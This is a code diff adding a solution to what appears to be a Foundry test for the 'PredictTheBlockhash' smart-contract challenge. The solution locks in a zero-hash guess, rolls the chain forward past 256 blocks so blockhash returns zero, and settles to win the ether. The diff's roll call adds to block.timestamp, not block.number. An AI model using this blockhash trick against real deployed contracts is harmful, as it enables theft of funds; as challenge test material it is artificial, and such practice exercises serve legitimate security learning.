@@ -18,12 +18,19 @@ contract PredictTheBlockhashTest is Test {
 
     function testExploit() public {
         // Set block number
-        uint256 blockNumber = block.number;
         // To roll forward, add the number of blocks to blockNumber,
         // Eg. roll forward 10 blocks: blockNumber + 10
-        vm.roll(blockNumber + 10);
-
         // Put your solution here
+
+        address Alice = address(0x5E12E7);
+        deal(Alice, 1 ether);
+
+        vm.startPrank(Alice);
+        predictTheBlockhash.lockInGuess{value: 1 ether}("");
+
+        vm.roll(block.timestamp + 258);
+
+        predictTheBlockhash.settle();
 
         _checkSolved();
     }
